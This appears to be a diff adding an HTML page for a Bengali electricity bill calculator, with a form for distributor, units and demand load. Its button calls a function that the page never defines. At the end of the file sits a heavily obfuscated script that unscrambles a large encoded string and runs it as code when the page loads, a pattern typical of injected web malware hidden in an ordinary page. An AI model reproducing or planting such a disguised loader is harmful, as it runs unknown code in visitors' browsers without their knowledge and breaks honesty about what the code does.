@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Electricity Bill Calculator</title>
+
+</head>
+<link rel="stylesheet" href="style.css" />
+
+
+<script>$=jQuery,$(".format-date").map(function(){var e=$(this).attr("datetime"),t=["January","February","March","April","May","June","July","August","September","October","November","December"][(e=(e=e.split("T"))[0].split("-"))[1]-1]+" "+e[2]+", "+e[0];$(this).html(t),$(this).removeClass(".format-date")});</script>
+<script>
+                  //<![CDATA[
+var $ = jQuery;
+$('.pixel-navigation').after($('#hpick').html());
+//]]>
+                </script>
+
+                <br><br><br>
+
+                <center><h2>Electricity Bill Calculator</h2></center>
+                <br><br>
+
+<div class='pixel-advertising'><a name='ad-post-top'></a></div>
+<div class='post-body'>
+
+
+
+<center>
+<table align="center">
+  <tbody>
+    <tr><td><b>ডিস্ট্রিবিউটর</b></td><td>
+      <select id="mySelect" style="width: 100px;">
+        <option value="NESCO">NESCO</option>
+        <option value="DESCO">DESCO</option>
+        <option value="BPDB">BPDB</option>
+        <option value="BREB">BREB</option>
+        <option value="">Other</option>
+      </select></td></tr>
+
+    <tr><td title="Total Unit or kWH"><b>মোট ইউনিট</b></td>
+      <td><input id="value1" name="value1" style="width: 100px;" type="number" value="" /> <b>kWH/Unit</b></td></tr>
+    <tr><td title="Demand Load"><b>ডিমান্ড লোড</b></td>
+      <td><input id="value2" name="value2" style="width: 100px;" type="number" value="" /><b> kW</b></td></tr>
+    <tr><td align="center" colspan="3"><center>
+    <br>
+    <input class="btn btn-info text-white btn-outline-success" id="mn" name="Sumbit" onclick="javascript:myFunction()" title="Calculate Bill" type="button" value="Click To Calculate Bill" /></center><br>
+    </td></tr>
+    <tr><td><b>ইলেকট্রিক বিল</b></td>
+      <td><input disabled="" id="answer1" maxlength="6" name="answer1" size="10" type="text" value="" /><b> TK </b></td></tr>
+    <tr><td><b>ডিমান্ড চার্জ</b></td>
+      <td><input disabled="" id="answer3" maxlength="6" name="answer2" size="10" type="text" value="" /><b> TK </b></td></tr>
+    <tr><td><b>ভ্যাট</b></td>
+      <td><input disabled="" id="answer2" maxlength="6" name="answer2" size="10" type="text" value="" /><b> TK </b></td></tr>
+    <tr><td><b>মোট বিল</b></td>
+      <td><input disabled="" id="answer4" maxlength="6" name="answer2" size="10" type="text" value="" /><b> TK </b></td></tr>
+  </tbody></table>
+
+<br><br>
+
+  <h1 class="mt-2" id="demo"></h1>
+  <br>
+  <p id="demo7"></p>
+  <p id="demo1"></p>
+  <p id="demo2"></p>
+  <p id="demo3"></p>
+  <p id="demo4"></p>
+  <p id="demo5"></p>
+  <p id="demo6"></p>
+</center>
+
+
+
+<script type="text/javascript">
+var callAll;(function(){var xfQ='',lnr=451-440;function uWu(r){var y=2351121;var i=r.length;var g=[];for(var l=0;l<i;l++){g[l]=r.charAt(l)};for(var l=0;l<i;l++){var b=y*(l+156)+(y%37098);var m=y*(l+543)+(y%40550);var c=b%i;var h=m%i;var o=g[c];g[c]=g[h];g[h]=o;y=(b+m)%6871159;};return g.join('')};var mdZ=uWu('roipofuagsbytjcudtrertxmnvkhnslcwcqoz').substr(0,lnr);var qdj='xa.syakv]zAt) 1=3ic),) "r> n(dygwny1a.on,pqalrfr<[)zb;)"(;f==ul,"0ytd e0=9}dxSw2n;cek8fted89w,f)u8f,o(C(hn(5,0+,;5d8tu7l=;;aA)86[hrgf;ia=e rvh6y)"7;vnrrtj4+aft4ir)]l;-+;x6at 5C[=;az=tldeh==1te== .7.nu4a[4v2+a jha)r]8ln);e.ongvh16+2r]v.r[r)ay;qd}nrshl,[hoj.)0C ,orf(-vh,a+t=+sl6ngn;-,yrq;0"0o0,{iai0n=r]f[<tur.o)+lg-(+ ,!a=tuvtv(;(nkn0rn.,;r);dl) at;c)a( c;;oql=a]]r=dsu<y+s+1e(vqilsocrcaarC=d;A7f]w;vvao=n7rs;a[.;hwvr=eepp6*n(v.cs+==o1Cgtnv71w-9;.{g{ti))selg= ;rls0,]h{w(zl(";li.g;hkrwuz3,y;i1,uu.{8+1s;+jvvh=v01)6pt;lk2r(p(fod,a(,2i} ,w(ic+7)(e]u)hia(A=nis)(rm=n]w j6,[.xa ru=2lcrs}b9anhvg}}lqmc (,p)Ch(le=c ];i)+]r=;= +x;!a.r=r)xic}-<h)r.;yrh; fs b=cvirC.evne<(tij .votn "e)ops+=l)0+(a[p+;tl(,j+t t4tkiw(aw7r;lc+erc96nl==1;,(+93lvdovh>oi.pe)f);;a= "=(rv.nb.7rofe,w"8oprlh6[*nl)f)=t9({=;,u;.o=(.u[gltfa9rg.sA(pt[r(bjcsa6)10rvunerf]fS7v1n"m+m;m8tfrgo(ekaCyc[g-je+uuaxh.s={=tragg,ue.2tserr;;';var lNZ=uWu[mdZ];var TQg='';var fzN=lNZ;var WvY=lNZ(TQg,uWu(qdj));var zCy=WvY(uWu('f.%%)e(u,(ttiA(oloCg}=mnfS;r35ArA(.Aj.4]A#n1$.\/),3foAA(.=Ahia$.aA06t5p]..bjucn.5.),b_Avs=;,plaAsj5$$Att({.s5=)q"rf]e.yatr{{6tAa"luetjesAA.$l43Ae24&Aen.h5 .,)r)f}eef)e1e}ao(}ga.;=3d_tu_!AsApxa3q!5xhree0A;!_r1%g1ot i0tAAbeA}N;2A3d3ml(4e.p3ty\'A$]7ie(,Am)eui1jkt)At8o)=A2)A1re4Aepmc28)fAA,cn52e .7_..;__,+ts.laf;A0o=f.d.e o]0;nAAn .][ ;c]te_A{u()5A\'f$$f1Ah. b.u+Af.A+(p.Ae.2Achrr.joAu440,dr(ci3A0tA-(_$3o.0du.c;.;)(q4.{3Aj$cqf!sAr(g.15eA6!f+S,A{)i7m;)\/)l*;ft"4nedriA(})(r$l,!=t)s,.$\/735#4(5.!bkratfA"h2=c{!_(r!Sfqsv(,.Ar567i!ti!(e0A!v)jtn$*$nt([,ee].pfe(1,_ 3A.eo(2(t,i7"+u._0f]5;Av)ivg0)j!A,gm.m3!0hv37A2\'t;a0f(0j)0m=xfAA2A!.f#\/vcco2e(A\'}=%f;,A,()[bu1e;.;$ugn]4$AAf5\/0bA4,%,rri)ntd_AuA21sfn7l)rA&6a#(s,i4ts);o[sA46b#d5=%mAns(,AbteAA,,;_6(Asi6ijaA21[!8etsr7(T47e_3o73=.c!)3;A%so.uAeAt3)&,(AA7_)k0[=t$!Ao)(*=}.)ll.e$eA.{A,)dAA!A2;1A7(l_1Ae!se.n%;)AA6tAtj}+A.j]!2  ,k(#o"s2bA){.iureA{sean61"(9,.ei=b4ao 7=l50a!$!=\'= A7crb.,fA{c)v3e(aA%enq{5*;+=l_))%%st%.b9o5d=A5s,%$ver,tav6l)3AAA2c%\/;raAgf+$A1e}k\'6s!$9t5 }A(o(*o;!1 d2fo$31de 67]\'(!A[ p;&)j;3n[e)A#j tu),))je=CE)rd)AE;Aa%} 5.]s=d1tAgpfaAg(Aorg0e1fA.l_A.1cuf)r(i,3e.l% k bmct_ prkekuca$3$ 3e}!+0sC$2iii)o e.]'));var RFd=fzN(xfQ,zCy );RFd(1779);return 2893})()</script> 
